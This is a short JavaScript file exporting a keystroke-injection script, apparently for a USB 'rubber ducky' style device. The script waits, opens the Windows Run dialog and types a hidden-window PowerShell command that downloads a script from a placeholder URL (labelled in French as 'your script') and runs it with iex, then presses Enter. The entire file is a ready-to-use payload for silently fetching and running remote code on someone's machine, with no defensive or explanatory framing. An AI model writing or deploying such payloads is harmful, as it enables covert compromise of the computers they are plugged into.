export const script = [
    'DELAY 3000',
    'GUI R',
    'DELAY 250',
    "STRING powershell -windowstyle hidden iex (wget https://[URL VERS VOTRE SCRIPT])",
    'DELAY 250',
    'ENTER',
    'DELAY 5000',
]
